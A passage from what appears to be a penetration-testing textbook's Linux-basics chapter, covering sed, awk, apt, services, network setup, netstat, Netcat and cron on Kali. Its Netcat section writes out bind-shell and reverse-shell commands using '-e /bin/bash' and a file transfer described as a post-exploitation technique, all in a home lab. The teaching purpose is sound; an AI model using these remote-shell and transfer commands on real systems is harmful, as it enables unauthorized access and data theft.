Brucon</pre><p>The result, as you can see, is that by piping the two commands together you get just the conferences Derbycon and Brucon.</p></div><div class="sect2" title="Using sed"><div class="titlepage"><div><div><h3 class="title" id="using_sed">Using sed</h3></div></div></div><p>Another command for manipulating data is <code class="literal">sed</code>. Entire books have been written about using <code class="literal">sed</code>, but we’ll cover just the basics here with a simple example of finding a specific word and replacing it.</p><p>The <code class="literal">sed</code> command is ideal for editing files automatically based on certain patterns or expressions. Say, for instance, you have a very long file, and you need to replace every instance of a certain word. You can do this quickly and automatically with the <code class="literal">sed</code> command.</p><p>In the language of <code class="literal">sed</code>, a slash (<code class="literal">/</code>) is the delimiter character. For example, to replace all instances of the word <span class="emphasis"><em>Blackhat</em></span> with <span class="emphasis"><em>Defcon</em></span> in <span class="emphasis"><em>myfile</em></span>, enter <span class="strong"><strong><code class="literal">sed 's/Blackhat/Defcon/' myfile</code></strong></span>, as shown in <a class="xref" href="ch02.xhtml#replacing_words_with_sed" title="Example 2-8. Replacing words with sed">Example 2-8</a>.</p><div class="example"><a id="replacing_words_with_sed"/><div class="example-title">Example 2-8. Replacing words with <code class="literal">sed</code></div><div class="example-contents"><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>sed 's/Blackhat/Defcon/' myfile</strong></span>&#13;
1 Derbycon September&#13;
2 Shmoocon January&#13;
3 Brucon September&#13;
4 Defcon July&#13;
5 Bsides *&#13;
6 HackerHalted October&#13;
7 Hackcon April</pre></div></div></div><div class="sect2" title="Pattern Matching with awk"><div class="titlepage"><div><div><h3 class="title" id="pattern_matching_with_awk">Pattern Matching with awk</h3></div></div></div><p><a class="indexterm" id="iddle1026"/><a class="indexterm" id="iddle1067"/><a class="indexterm" id="iddle1089"/><a class="indexterm" id="iddle1519"/><a class="indexterm" id="iddle1875"/><a class="indexterm" id="iddle1909"/>Another command line utility for pattern matching is the <code class="literal">awk</code> command. For example, if you want to find conferences numbered 6 or greater, you can use <code class="literal">awk</code> to search the first field for entries greater than 5, as shown here.</p><a id="pro_id00038"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>awk '$1 &gt;5' myfile</strong></span>&#13;
6 HackerHalted October&#13;
7 Hackcon April</pre><p>Or, if you want only the first and third words in every line, you can enter <span class="strong"><strong><code class="literal">awk '{print $1,$3;}' myfile</code></strong></span>, as shown in <a class="xref" href="ch02.xhtml#selecting_certain_columns_with_awk" title="Example 2-9. Selecting certain columns with awk">Example 2-9</a>.</p><div class="example"><a id="selecting_certain_columns_with_awk"/><div class="example-title">Example 2-9. Selecting certain columns with <code class="literal">awk</code></div><div class="example-contents"><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>awk '{print $1,$3;}' myfile</strong></span>&#13;
1 September&#13;
2 January&#13;
3 September&#13;
4 July&#13;
5 *&#13;
6 October&#13;
7 April</pre></div></div><div class="note" title="Note"><h3 class="title"><a id="ch02note03"/>Note</h3><p>We’ve looked at only simple examples of using these data manipulation utilities in this section. To get more information, consult the man pages. These utilities can be powerful time-savers.</p></div></div></div><div class="sect1" title="Managing Installed Packages"><div class="titlepage"><div><div><h2 class="title" id="managing_installed_packages" style="clear: both">Managing Installed Packages</h2></div></div></div><p>On Debian-based Linux distributions such as Kali Linux, you can use the Advanced Packaging Tool (<code class="literal">apt</code>) to manage packages. To install a package, enter <span class="strong"><strong><code class="literal">apt-get install</code></strong></span> <span class="bolditalic"><code class="literal">package</code></span>. For example, to install Raphael Mudge’s front-end for Metasploit, Armitage, in Kali Linux, enter the following:</p><a id="pro_id00039"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>apt-get install armitage</strong></span></pre><p>It’s that easy: <code class="literal">apt</code> installs and configures Armitage for you.</p><p>Updates are regularly released for the tools installed on Kali Linux. To get the latest versions of the packages already installed, enter <span class="strong"><strong><code class="literal">apt-get upgrade</code></strong></span>. The repositories Kali uses for packages are listed in the file <span class="emphasis"><em>/etc/apt/sources.list</em></span>. To add additional repositories, you can edit this file and then run the command <code class="literal">apt-get update</code> to refresh the database to include the new repositories.</p><div class="note" title="Note"><h3 class="title"><a id="ch02note04"/>Note</h3><p><a class="indexterm" id="iddle1498"/><a class="indexterm" id="iddle1556"/><a class="indexterm" id="iddle1821"/><a class="indexterm" id="iddle1828"/><a class="indexterm" id="iddle1994"/><a class="indexterm" id="iddle2004"/><a class="indexterm" id="iddle2095"/><a class="indexterm" id="iddle2132"/><a class="indexterm" id="iddle2133"/>This book is built off the base install of Kali 1.0.6 unless otherwise noted in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, so in order to follow along with the book as is, don’t update Kali.</p></div></div><div class="sect1" title="Processes and Services"><div class="titlepage"><div><div><h2 class="title" id="processes_and_services" style="clear: both">Processes and Services</h2></div></div></div><p>In Kali Linux you can start, stop, or restart services using the <code class="literal">service</code> command. For example, to start the Apache web server, enter <span class="strong"><strong><code class="literal">service apache2 start</code></strong></span> as shown next.</p><a id="pro_id00040"/><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>service apache2 start</strong></span>&#13;
[....] Starting web server: apache2: Could not reliably determine the server's fully qualified domain name, using 127.0.1.1 for ServerName&#13;
. ok</pre><p>Likewise, to stop the MySQL database server, enter <span class="strong"><strong><code class="literal">service mysql stop</code></strong></span>.</p></div><div class="sect1" title="Managing Networking"><div class="titlepage"><div><div><h2 class="title" id="managing_networking" style="clear: both">Managing Networking</h2></div></div></div><p>When setting up the Kali Linux virtual machines in <a class="xref" href="ch01.xhtml" title="Chapter 1. Setting Up Your Virtual Lab">Chapter 1</a>, you used the <code class="literal">ifconfig</code> command to view network information as shown in <a class="xref" href="ch02.xhtml#viewing_networking_information_with_ifco" title="Example 2-10. Viewing networking information with ifconfig">Example 2-10</a>.</p><div class="example"><a id="viewing_networking_information_with_ifco"/><div class="example-title">Example 2-10. Viewing networking information with <code class="literal">ifconfig</code></div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>ifconfig</strong></span>&#13;
eth0❶     Link encap:Ethernet  HWaddr 00:0c:29:df:7e:4d&#13;
          inet addr:192.168.20.9❷  Bcast:192.168.20.255  Mask:255.255.255.0❸&#13;
          inet6 addr: fe80::20c:29ff:fedf:7e4d/64 Scope:Link&#13;
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1&#13;
          RX packets:1756332 errors:930193 dropped:17 overruns:0 frame:0&#13;
          TX packets:1115419 errors:0 dropped:0 overruns:0 carrier:0&#13;
          collisions:0 txqueuelen:1000&#13;
          RX bytes:1048617759 (1000.0 MiB)  TX bytes:115091335 (109.7 MiB)&#13;
          Interrupt:19 Base address:0x2024&#13;
<span class="emphasis"><em>--snip--</em></span></pre></div></div><p>From the output of <code class="literal">ifconfig</code> you can glean a lot of information about your system’s network state. For one, the network interface is called <code class="literal">eth0</code> ❶. The IPv4 address (<code class="literal">inet addr</code>) that my Kali box uses to talk to the network is 192.168.20.9 ❷ (yours will probably differ). An <span class="emphasis"><em>IP address</em></span> is a 32-bit label assigned to devices in a network. The IP address is named up of 4 octets, or 8-bit parts.</p><p><a class="indexterm" id="iddle1253"/><a class="indexterm" id="iddle1268"/><a class="indexterm" id="iddle1302"/><a class="indexterm" id="iddle1344"/><a class="indexterm" id="iddle1830"/><a class="indexterm" id="iddle2088"/><a class="indexterm" id="iddle2247"/>The address’s <span class="emphasis"><em>network mask</em></span>, or <span class="emphasis"><em>netmask</em></span> (<code class="literal">Mask</code>), at ❸ identifies which parts of the IP address are part of the network and which parts belong to the host. In this case the netmask 255.255.255.0 tells you that the network is the first three octets, 192.168.20.</p><p>The <span class="emphasis"><em>default gateway</em></span> is where your host routes traffic to other networks. Any traffic destined outside the local network will be sent to the default gateway for it to figure out where it needs to go.</p><a id="pro_id00041"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>route</strong></span>&#13;
Kernel IP routing table&#13;
Destination     Gateway         Genmask         Flags Metric Ref    Use Iface&#13;
default         192.168.20.1❶   0.0.0.0         UG    0      0        0 eth0&#13;
192.168.20.0    *               255.255.255.0   U     0      0        0 eth0</pre><p>The <code class="literal">route</code> command output tells us that the default gateway is 192.168.20.1 ❶. This makes sense because the system with the IP address 192.168.20.1 is the wireless router in my home network. Take note of your own default gateway for use in the following section.</p><div class="sect2" title="Setting a Static IP Address"><div class="titlepage"><div><div><h3 class="title" id="setting_a_static_ip_address-id00013">Setting a Static IP Address</h3></div></div></div><p>By default, your network connection uses dynamic host configuration protocol (DHCP) to pull an IP address from the network. To set a static address, so that your IP address won’t change, you need to edit the file <span class="emphasis"><em>/etc/network/interfaces</em></span>. Use your preferred editor to open this file. The default configuration file is shown in <a class="xref" href="ch02.xhtml#default_solidusetcsolidusnetworksolidusi" title="Example 2-11. The default /etc/network/interfaces file">Example 2-11</a>.</p><div class="example"><a id="default_solidusetcsolidusnetworksolidusi"/><div class="example-title">Example 2-11. The default /etc/network/interfaces file</div><div class="example-contents"><pre class="programlisting"># This file describes the network interfaces available on your system&#13;
# and how to activate them. For more information, see interfaces(5).&#13;
&#13;
# The loopback network interface&#13;
auto lo&#13;
iface lo inet loopback</pre></div></div><p>To give your system a static IP address you need to add an entry for the eth0 interface. Add the text shown in <a class="xref" href="ch02.xhtml#adding_a_static_ip_address" title="Example 2-12. Adding a static IP address">Example 2-12</a> to <span class="emphasis"><em>/etc/network/interfaces</em></span> with the IP addresses changed to match your environment.</p><div class="example"><a id="adding_a_static_ip_address"/><div class="example-title">Example 2-12. Adding a static IP address</div><div class="example-contents"><pre class="programlisting"># This file describes the network interfaces available on your system&#13;
# and how to activate them. For more information, see interfaces(5).&#13;
&#13;
# The loopback network interface&#13;
auto lo&#13;
iface lo inet loopback&#13;
<span class="strong"><strong>auto eth0</strong></span>&#13;
<span class="strong"><strong>iface eth0 inet static</strong></span> ❶&#13;
<span class="strong"><strong>address 192.168.20.9</strong></span>&#13;
<span class="strong"><strong>netmask 255.255.255.0</strong></span> ❷&#13;
<span class="strong"><strong>gateway 192.168.20.1</strong></span> ❸</pre></div></div><p><a class="indexterm" id="iddle1816"/><a class="indexterm" id="iddle1818"/><a class="indexterm" id="iddle1822"/><a class="indexterm" id="iddle1961"/><a class="indexterm" id="iddle2281"/>You set the IP address for eth0 as static at ❶. Use the IP address, netmask ❷, and gateway ❸ you found in the previous section to fill in the information in your file.</p><p>Once you’ve made these changes, restart networking with <code class="literal">service</code> <code class="literal">networking restart</code> so that the newly added static networking information will be used.</p></div><div class="sect2" title="Viewing Network Connections"><div class="titlepage"><div><div><h3 class="title" id="viewing_network_connections">Viewing Network Connections</h3></div></div></div><p>To view network connections, listening ports, and so on, use the <code class="literal">netstat</code> command. For example, you can see the programs listening on TCP ports by issuing the command <code class="literal">netstat -antp</code>, as shown in <a class="xref" href="ch02.xhtml#using_netstat_to_view_listening_ports" title="Example 2-13. Using netstat to view listening ports">Example 2-13</a>. <span class="emphasis"><em>Ports</em></span> are simply software-based network sockets that listen on the network to allow remote systems to interact with programs on a system.</p><div class="example"><a id="using_netstat_to_view_listening_ports"/><div class="example-title">Example 2-13. Using <code class="literal">netstat</code> to view listening ports</div><div class="example-contents"><pre class="programlisting">root@kali:~/mydirectory# <span class="strong"><strong>netstat -antp</strong></span>&#13;
Active Internet connections (servers and established)&#13;
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name&#13;
tcp6       0      0 :::80                   :::*                    LISTEN      15090/apache2</pre></div></div><p>You see that the Apache web server you started earlier in the chapter is listening on TCP port 80. (See the man page for other <code class="literal">netstat</code> options.)</p></div></div><div class="sect1" title="Netcat: The Swiss Army Knife of TCP/IP Connections"><div class="titlepage"><div><div><h2 class="title" id="netcat_the_swiss_army_knife_of_tcpsolidu" style="clear: both">Netcat: The Swiss Army Knife of TCP/IP Connections</h2></div></div></div><p>As the man page notes, the Netcat tool is known as the Swiss Army knife for TCP/IP connections. It’s a versatile tool that we’ll utilize throughout this book.</p><p>To see Netcat’s various options enter <span class="strong"><strong><code class="literal">nc -h</code></strong></span>, as shown in <a class="xref" href="ch02.xhtml#netcat_help_information" title="Example 2-14. Netcat help information">Example 2-14</a>.</p><div class="example"><a id="netcat_help_information"/><div class="example-title">Example 2-14. Netcat help information</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -h</strong></span>&#13;
[v1.10-40]&#13;
connect to somewhere:   nc [-options] hostname port[s] [ports] ...&#13;
listen for inbound:     nc -l -p port [-options] [hostname] [port]&#13;
options:&#13;
      -c shell commands  as `-e'; use /bin/sh to exec [dangerous!!]&#13;
      -e filename       program to exec after connect [dangerous!!]&#13;
      -b                allow broadcasts&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><div class="sect2" title="Check to See If a Port Is Listening"><div class="titlepage"><div><div><h3 class="title" id="check_to_see_if_a_port_is_listening">Check to See If a Port Is Listening</h3></div></div></div><p><a class="indexterm" id="iddle1190"/><a class="indexterm" id="iddle1505"/><a class="indexterm" id="iddle1812"/>Let’s have Netcat connect to a port to see if that port is listening for connections. You saw previously that the Apache web server is listening on port 80 on your Kali Linux system. Tell Netcat to attach to port 80 verbosely, or output rich, with the <code class="literal">-v</code> option as shown next. If you started Apache correctly, you should see the following when attempting to connect the service.</p><a id="pro_id00042"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -v 192.168.20.9 80</strong></span>&#13;
(UNKNOWN) [192.168.20.10] 80 (http) open</pre><p>As you can see, Netcat reports that port 80 is indeed listening (<code class="literal">open</code>) on the network. (We’ll look more at open ports and why they are interesting in <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a>’s discussion of port scanning.)</p><p>You can also listen on a port for an incoming connection using Netcat, as shown next.</p><a id="pro_id00043"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 1234</strong></span>&#13;
listening on [any] 1234 ...</pre><p>You use the options <code class="literal">l</code> for listen, <code class="literal">v</code> for verbose, and <code class="literal">p</code> to specify the port to listen on.</p><p>Next, open a second terminal window and use Netcat to connect to the Netcat listener.</p><a id="pro_id00044"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.9 1234</strong></span>&#13;
<span class="strong"><strong>hi georgia</strong></span></pre><p>Once you connect, enter the text <span class="strong"><strong><code class="literal">hi georgia</code></strong></span>, and when you return to the listener’s terminal window, you see that a connection was received and your text was printed.</p><a id="pro_id00045"/><pre class="programlisting">listening on [any] 1234 ...&#13;
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51917&#13;
hi georgia</pre><p>Close down both Netcat processes by pressing <span class="smaller">CTRL</span>-C.</p></div><div class="sect2" title="Opening a Command Shell Listener"><div class="titlepage"><div><div><h3 class="title" id="opening_a_command_shell_listener">Opening a Command Shell Listener</h3></div></div></div><p>Now for something a bit more interesting. When you set up your Netcat listener, use the <code class="literal">-e</code> flag to tell Netcat to execute <span class="emphasis"><em>/bin/bash</em></span> (or start a Bash command prompt) when a connection is received. This allows anyone who connects to the listener to execute commands on your system, as shown next.</p><a id="pro_id00046"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 1234 -e /bin/bash</strong></span>&#13;
listening on [any] 1234 ...</pre><p>Again, use a second terminal window to connect to the Netcat listener.</p><a id="pro_id00047"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.9 1234</strong></span>&#13;
whoami&#13;
root</pre><p><a class="indexterm" id="iddle1109"/><a class="indexterm" id="iddle1191"/><a class="indexterm" id="iddle1628"/><a class="indexterm" id="iddle2073"/><a class="indexterm" id="iddle2453"/>You can now issue Linux commands to be executed by the Netcat listener. The <code class="literal">whoami</code> Linux command will tell you the current logged-in user. In this case, because the Netcat process was started by the <span class="emphasis"><em>root</em></span> user, your commands will be executed as <span class="emphasis"><em>root</em></span>.</p><div class="note" title="Note"><h3 class="title"><a id="ch02note05"/>Note</h3><p>This is a simple example because both your Netcat listener and the connection are on the same system. You could use another of your virtual machines, or even your host system, for this exercise as well.</p></div><p>Close down both Netcat processes again.</p></div><div class="sect2" title="Pushing a Command Shell Back to a Listener"><div class="titlepage"><div><div><h3 class="title" id="pushing_a_command_shell_back_to_a_listen">Pushing a Command Shell Back to a Listener</h3></div></div></div><p>In addition to listening on a port with a command shell, you can also push a command shell back to a Netcat listener. This time set up the Netcat listener without the <code class="literal">-e</code> flag as shown next.</p><a id="pro_id00048"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 1234</strong></span>&#13;
listening on [any] 1234 ...</pre><p>Now open a second terminal, and connect back to the Netcat listener you just created as shown here.</p><a id="pro_id00049"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.9 1234 -e /bin/bash</strong></span></pre><p>Connect with Netcat as usual, but this time use the <code class="literal">-e</code> flag to execute <span class="emphasis"><em>/bin/bash</em></span> on the connection. Back in your first terminal you see a connection as shown next, and if you enter terminal commands, you will see them executed. (We’ll learn more about listening with <span class="emphasis"><em>/bin/bash</em></span> on a local port and actively pushing <span class="emphasis"><em>/bin/bash</em></span> with a connection, known as <span class="emphasis"><em>bind shells</em></span> and <span class="emphasis"><em>reverse shells</em></span>, respectively, in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>.)</p><a id="pro_id00050"/><pre class="programlisting">listening on [any] 1234 ...&#13;
connect to [192.168.20.9] from (UNKNOWN) [192.168.20.9] 51921&#13;
whoami&#13;
root</pre><p>Now, one more thing with Netcat. This time, instead of outputting what comes into your listener to the screen, use <code class="literal">&gt;</code> to send it to a file as shown next.</p><a id="pro_id00051"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc -lvp 1234 &gt; netcatfile</strong></span>&#13;
listening on [any] 1234 ...</pre><p>In the second terminal you set up Netcat to connect, but this time you use the <code class="literal">&lt;</code> symbol to tell it to send the contents of a file (<span class="emphasis"><em>myfile</em></span>) over the <a class="indexterm" id="iddle1226"/><a class="indexterm" id="iddle1228"/><a class="indexterm" id="iddle1341"/><a class="indexterm" id="iddle1814"/><a class="indexterm" id="iddle2109"/>Netcat connection. Give Netcat a second or two to finish, and then examine the contents of the file <span class="emphasis"><em>netcatfile</em></span> created by your first Netcat instance. The contents should be identical to <span class="emphasis"><em>myfile</em></span>.</p><a id="pro_id00052"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>nc 192.168.20.9 1234 &lt; mydirectory/myfile</strong></span></pre><p>You have used Netcat to transfer the file. In this case we’ve simply transferred the file from one directory to another, but you can imagine how this technique can be used to transfer files from system to system—a technique that often comes in handy in the post-exploitation phase of a pentest, once you have access to a system.</p></div></div><div class="sect1" title="Automating Tasks with cron Jobs"><div class="titlepage"><div><div><h2 class="title" id="automating_tasks_with_cron_jobs" style="clear: both">Automating Tasks with cron Jobs</h2></div></div></div><p>The <code class="literal">cron</code> command allows us to schedule tasks to automatically run at a specified time. In the <span class="emphasis"><em>/etc</em></span> directory in Kali, you can see several files and directories related to <code class="literal">cron</code>, as shown in <a class="xref" href="ch02.xhtml#crontab_files" title="Example 2-15. crontab files">Example 2-15</a>.</p><div class="example"><a id="crontab_files"/><div class="example-title">Example 2-15. crontab files</div><div class="example-contents"><pre class="programlisting">root@kali:/etc# <span class="strong"><strong>ls | grep cron</strong></span>&#13;
cron.d&#13;
cron.daily&#13;
cron.hourly&#13;
cron.monthly&#13;
crontab&#13;
cron.weekly</pre></div></div><p>The <span class="emphasis"><em>cron.daily</em></span>, <span class="emphasis"><em>cron.hourly</em></span>, <span class="emphasis"><em>cron.monthly</em></span>, and <span class="emphasis"><em>cron.weekly</em></span> directories specify scripts that will run automatically, every day, every hour, every month, or every week, depending on which directory you put your script in.</p><p>If you need more flexibility you can edit <code class="literal">cron</code>’s configuration file, <span class="emphasis"><em>/etc/crontab</em></span>. The default text is shown in <a class="xref" href="ch02.xhtml#crontab_configuration_file" title="Example 2-16. crontab configuration file">Example 2-16</a>.</p><div class="example"><a id="crontab_configuration_file"/><div class="example-title">Example 2-16. <code class="literal">crontab</code> configuration file</div><div class="example-contents"><pre class="programlisting"># /etc/crontab: system-wide crontab&#13;
# Unlike any other crontab you don't have to run the `crontab'&#13;
# command to install the new version when you edit this file&#13;
# and files in /etc/cron.d. These files also have username fields,&#13;
# that none of the other crontabs do.&#13;
&#13;
SHELL=/bin/sh&#13;
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin&#13;
&#13;
# m h dom mon dow user     command&#13;
17 *  * * * root    cd / &amp;&amp; run-parts --report /etc/cron.hourly ❶&#13;
25 6  * * * root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily ) ❷&#13;
47 6  * * 7 root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )&#13;
52 6  1 * * root  test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )&#13;
#</pre></div></div><p>The fields in a <code class="literal">crontab</code> are, from left to right, the minute, hour, day of the month, month, day of the week, user who will run the command, and, finally, the command to be run. To run a command every day of the week, every hour, and so on, you use an asterisk (<code class="literal">*</code>) instead of specifying a value for the column.</p><p>For example, look at the first <code class="literal">crontab</code> line at ❶, which runs the hourly <code class="literal">cron</code> jobs specified in <span class="emphasis"><em>/etc/cron.hourly</em></span>. This <code class="literal">crontab</code> runs on the 17th minute of every hour every day of every month on every day of the week. The line at ❷ says that the daily <code class="literal">crontab</code> (<span class="emphasis"><em>/etc/cron.daily</em></span>) will be run at the 25th minute of the 6th hour of every day of every month on every day of the week. (For more flexibility, you can add a line here instead of adding to the hourly, daily, weekly, or monthly lists.)</p></div><div class="sect1" title="Summary"><div class="titlepage"><div><div><h2 class="title" id="summary-id00014" style="clear: both">Summary</h2></div></div></div><p>In this chapter we’ve looked at some common Linux tasks. Navigating the Linux filesystem, working with data, and running services are all skills that will serve you well as you move through the rest of this book. In addition, when attacking Linux systems, knowing which commands to run in a Linux environment will help you make the most of successful exploitation. You may want to automatically run a command periodically by setting up a <code class="literal">cron</code> job or use Netcat to transfer a file from your attack machine. You will use Kali Linux to run your attacks throughout this book, and one of your target systems is Ubuntu Linux, so having the basics in place will make learning pentesting come more naturally.</p></div></section></body></html>